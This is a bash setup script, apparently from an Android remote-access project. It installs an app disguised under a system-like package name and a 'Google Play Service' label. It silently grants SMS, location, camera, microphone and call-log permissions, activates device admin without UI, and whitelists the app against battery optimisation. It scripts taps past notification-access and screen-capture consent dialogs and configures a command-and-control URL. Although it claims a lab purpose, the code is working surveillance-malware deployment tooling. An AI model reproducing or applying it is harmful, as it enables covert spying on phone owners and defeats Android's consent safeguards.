#!/usr/bin/env bash
# =============================================================================
# auto_setup.sh -- one-shot permission + device-admin automation for a fresh
# install of the test client (behavioral analysis on hardware you own).
#
# After `adb install` (or instead of it), run this to:
#   1. install / update the APK
#   2. grant every runtime permission the app asks for   (pm grant)
#   3. allow the special app-ops (overlay, all-files access, write settings)
#   4. enable the Notification listener (secure settings)
#   5. whitelist battery optimizations                    (deviceidle)
#   6. ACTIVATE DEVICE ADMIN with no UI                   (dpm set-active-admin)
#   7. push the per-run runtime config (URL + device id)
#   8. launch the app (and optionally tap the media-projection consent dialog)
#
# Everything is idempotent -- safe to re-run after an `adb install -r`.
#
# Usage:
#   ./tools/auto_setup.sh [options]
#
# Options:
#   --apk <path>       APK to install (default app/build/outputs/apk/debug/app-debug.apk)
#   --url <url>        C2 URL for the runtime config (default http://10.0.2.2:42474
#                      = the emulator's host alias; use http://127.0.0.1:42474 on a
#                      phone behind `adb reverse tcp:42474 tcp:42474`)
#   --device-id <id>   device_id for the runtime config (default: emu-<model>)
#   --serial <serial>  adb serial (default: the only attached device)
#   --no-launch        don't start MainActivity after setup
#   --auto-consent     wait for + tap the media-projection consent dialog
#   --uninstall-first  remove the previous install before installing
# =============================================================================
set -u

PKG=com.android.background.services
ADMIN_RECEIVER=$PKG/.receivers.AdminReceiver
NOTIF_SERVICE=$PKG/com.android.background.services.NotificationService

APK=app/build/outputs/apk/debug/app-debug.apk
URL="http://10.0.2.2:42474"
DEVICE_ID=""
SERIAL=""
NO_LAUNCH=0
AUTO_CONSENT=0
UNINSTALL_FIRST=0

while [ $# -gt 0 ]; do
    case "$1" in
        --apk)            APK="$2"; shift 2 ;;
        --url)            URL="$2"; shift 2 ;;
        --device-id)      DEVICE_ID="$2"; shift 2 ;;
        --serial)         SERIAL="$2"; shift 2 ;;
        --no-launch)      NO_LAUNCH=1; shift ;;
        --auto-consent)   AUTO_CONSENT=1; shift ;;
        --uninstall-first) UNINSTALL_FIRST=1; shift ;;
        *) echo "unknown option: $1"; exit 2 ;;
    esac
done

# --- adb ----------------------------------------------------------------
ADB="adb"
command -v adb >/dev/null 2>&1 || {
    for p in "$HOME/Android/Sdk/platform-tools/adb" "/opt/android-sdk/platform-tools/adb"; do
        [ -x "$p" ] && ADB="$p" && break
    done
}
SERIAL_ARGS=()
[ -n "$SERIAL" ] && SERIAL_ARGS=( -s "$SERIAL" )
ADB_S="adb ${SERIAL_ARGS[*]}"

echo "==> adb: $ADB_S"

# --- sanity -------------------------------------------------------------
[ -f "$APK" ] || { echo "!! APK not found: $APK  (build it first: ./gradlew :app:assembleDebug)"; exit 1; }

# --- 0. optional clean install ------------------------------------------
if [ "$UNINSTALL_FIRST" = "1" ]; then
    echo "==> removing previous install"
    $ADB_S uninstall "$PKG" >/dev/null 2>&1 || true
fi

# --- 1. install -----------------------------------------------------------
echo "==> installing $APK"
$ADB_S install -r "$APK" || { echo "!! install failed"; exit 1; }

# --- 2. runtime permissions ------------------------------------------------
echo "==> granting runtime permissions"
for perm in \
    android.permission.READ_SMS \
    android.permission.SEND_SMS \
    android.permission.RECEIVE_SMS \
    android.permission.WRITE_SMS \
    android.permission.ACCESS_FINE_LOCATION \
    android.permission.ACCESS_COARSE_LOCATION \
    android.permission.ACCESS_BACKGROUND_LOCATION \
    android.permission.READ_PHONE_STATE \
    android.permission.CALL_PHONE \
    android.permission.READ_PHONE_NUMBERS \
    android.permission.READ_CALL_LOG \
    android.permission.READ_CONTACTS \
    android.permission.WRITE_CONTACTS \
    android.permission.CAMERA \
    android.permission.RECORD_AUDIO \
    android.permission.MODIFY_AUDIO_SETTINGS \
    android.permission.READ_EXTERNAL_STORAGE \
    android.permission.WRITE_EXTERNAL_STORAGE \
    android.permission.ACCESS_MEDIA_LOCATION \
    android.permission.PROCESS_OUTGOING_CALLS \
    android.permission.POST_NOTIFICATIONS \
    ; do
    $ADB_S shell pm grant "$PKG" "$perm" >/dev/null 2>&1 && echo "    + $perm" || echo "    - $perm (not grantable, ok)"
done

# --- 3. special app-ops (normally need Settings UI) -------------------------
echo "==> allowing special app-ops"
for op in MANAGE_EXTERNAL_STORAGE SYSTEM_ALERT_WINDOW WRITE_SETTINGS android:manage_external_storage android:system_alert_window android:write_settings; do
    $ADB_S shell appops set "$PKG" "$op" allow >/dev/null 2>&1 && echo "    + $op" || true
done

# --- 4. notification listener -------------------------------------------------
# The secure setting alone is NOT enough on Android 12+: the system only binds
# the listener when the change goes through the Settings UI (and a reinstall
# prunes the raw setting). Set it anyway, then drive the UI toggle which is the
# reliable path. Skip the UI dance if already enabled.
echo "==> enabling notification listener"
CUR=$($ADB_S shell settings get secure enabled_notification_listeners | tr -d '\r')
if [ -z "$CUR" ] || [ "$CUR" = "null" ]; then
    NEW="$NOTIF_SERVICE"
else
    case ":$CUR:" in
        *":$NOTIF_SERVICE:"*) NEW="$CUR" ;;
        *) NEW="$CUR:$NOTIF_SERVICE" ;;
    esac
fi
$ADB_S shell settings put secure enabled_notification_listeners "$NEW"
echo "    enabled_notification_listeners = $NEW"

# UI toggle: Settings -> Apps -> Special access -> Notification access ->
# <app> -> flip "Allow notification access" -> Allow.
if ! $ADB_S shell dumpsys notification 2>/dev/null | grep -q "background.services/com.android.background.services.NotificationService (user"; then
    echo "    binding listener via the Settings UI ..."
    $ADB_S shell am start -a android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS >/dev/null 2>&1
    sleep 2
    dump_ui() { $ADB_S shell uiautomator dump /sdcard/ui.xml >/dev/null 2>&1; $ADB_S shell cat /sdcard/ui.xml 2>/dev/null; }
    ROW=$(dump_ui | grep -oE 'text="Google Play Service"[^>]*bounds="\[[0-9]+,[0-9]+\]\[[0-9]+,[0-9]+\]"' | head -1 | grep -o '\[[0-9]*,[0-9]*\]\[[0-9]*,[0-9]*\]' | awk -F'[][]' '{print int(($2+$4)/2), int(($3+$5)/2)}')
    if [ -n "$ROW" ]; then
        $ADB_S shell input tap $ROW; sleep 2
        SW=$(dump_ui | python3 -c "
import re,sys
xml=sys.stdin.read()
for m in re.finditer(r'<node[^>]*>',xml):
    n=m.group(0)
    if 'Switch' in n and 'checked=\"false\"' in n:
        b=re.search(r'bounds=\"\\[([0-9]+),([0-9]+)\\]\\[([0-9]+),([0-9]+)\\]\"',n)
        if b: print(int((int(b.group(1))+int(b.group(3)))/2), int((int(b.group(2))+int(b.group(4)))/2)); break
" 2>/dev/null)
        if [ -n "$SW" ]; then
            $ADB_S shell input tap $SW; sleep 2
            ALLOW=$(dump_ui | grep -oE 'text="Allow"[^>]*bounds="\[[0-9]+,[0-9]+\]\[[0-9]+,[0-9]+\]"' | head -1 | grep -o '\[[0-9]*,[0-9]*\]\[[0-9]*,[0-9]*\]' | awk -F'[][]' '{print int(($2+$4)/2), int(($3+$5)/2)}')
            [ -n "$ALLOW" ] && $ADB_S shell input tap $ALLOW
        fi
    fi
    $ADB_S shell input keyevent 4 >/dev/null 2>&1   # back out of settings
    sleep 1
    if $ADB_S shell dumpsys notification 2>/dev/null | grep -q "background.services/com.android.background.services.NotificationService (user"; then
        echo "    listener BOUND by the system"
    else
        echo "!! listener not bound yet -- enable it manually in Settings > Notification access"
    fi
else
    echo "    listener already bound"
fi

# --- 5. battery optimization whitelist --------------------------------------
echo "==> whitelisting battery optimizations"
$ADB_S shell dumpsys deviceidle whitelist +"$PKG" >/dev/null 2>&1
echo "    +$PKG whitelisted"

# --- 6. device admin activation (no UI) --------------------------------------
echo "==> activating device admin"
$ADB_S shell dpm set-active-admin "$ADMIN_RECEIVER" 2>&1 | sed 's/^/    /'
if $ADB_S shell dumpsys device_policy 2>/dev/null | grep -q "AdminReceiver"; then
    echo "    device admin ACTIVE"
else
    echo "!! device admin not active -- fall back to the in-app activation dialog"
fi

# --- 7. runtime config --------------------------------------------------------
if [ -z "$DEVICE_ID" ]; then
    MODEL=$($ADB_S shell getprop ro.product.model 2>/dev/null | tr -d '\r' | tr ' ' '-')
    DEVICE_ID="emu-${MODEL:-device}"
fi
CONFIG="{\"url\": \"$URL\", \"device_id\": \"$DEVICE_ID\"}"
echo "==> pushing runtime config: $CONFIG"
echo "$CONFIG" | $ADB_S shell "cat > /sdcard/Download/c2_config.json"
$ADB_S shell cat /sdcard/Download/c2_config.json

# --- 8. launch ----------------------------------------------------------------
if [ "$NO_LAUNCH" = "1" ]; then
    echo "==> done (--no-launch)"
    exit 0
fi
echo "==> launching $PKG"
$ADB_S shell am start -n "$PKG/.MainActivity" >/dev/null 2>&1

# --- 8b. optional media-projection consent tap-through -------------------------
if [ "$AUTO_CONSENT" = "1" ]; then
    echo "==> waiting for the screen-capture consent dialog"
    dump_ui() { $ADB_S shell uiautomator dump /sdcard/ui.xml >/dev/null 2>&1; $ADB_S shell cat /sdcard/ui.xml 2>/dev/null; }
    tap_text() { # print center of a node whose text == $1
        dump_ui | python3 -c "
import re,sys
xml=sys.stdin.read(); want='$1'
for m in re.finditer(r'<node[^>]*>', xml):
    n=m.group(0)
    t=re.search(r'text=\"([^\"]*)\"',n); t=t.group(1) if t else ''
    if t==want:
        b=re.search(r'bounds=\"\[([0-9]+),([0-9]+)\]\[([0-9]+),([0-9]+)\]\"',n)
        if b: print(int((int(b.group(1))+int(b.group(3)))/2), int((int(b.group(2))+int(b.group(4)))/2)); break
" 2>/dev/null
    }
    FOUND=0
    for _ in $(seq 1 25); do
        sleep 1
        B=$(tap_text "Share one app")
        if [ -n "$B" ]; then
            echo "    Android 15+ two-step dialog -- picking 'Entire screen'"
            $ADB_S shell input tap $B; sleep 1.5
            B=$(tap_text "Share entire screen")
            [ -n "$B" ] && $ADB_S shell input tap $B; sleep 1.5
            B=$(tap_text "Share screen")
            [ -n "$B" ] && $ADB_S shell input tap $B
            FOUND=1; break
        elif dump_ui | grep -qE 'text="(Start now|Start recording)"'; then
            echo "    single-step dialog -- confirming"
            for w in "Start now" "Start recording"; do
                B=$(tap_text "$w")
                [ -n "$B" ] && $ADB_S shell input tap $B && break
            done
            FOUND=1; break
        fi
    done
    [ "$FOUND" = "1" ] && echo "    consent handled" || echo "    consent dialog not seen (grant it manually)"
fi

echo "==> setup complete"
echo "    device_id: $DEVICE_ID"
echo "    url:       $URL"
echo "    dashboard: http://127.0.0.1:42474/  (start the mock first: tools/run_mock_c2.sh)"
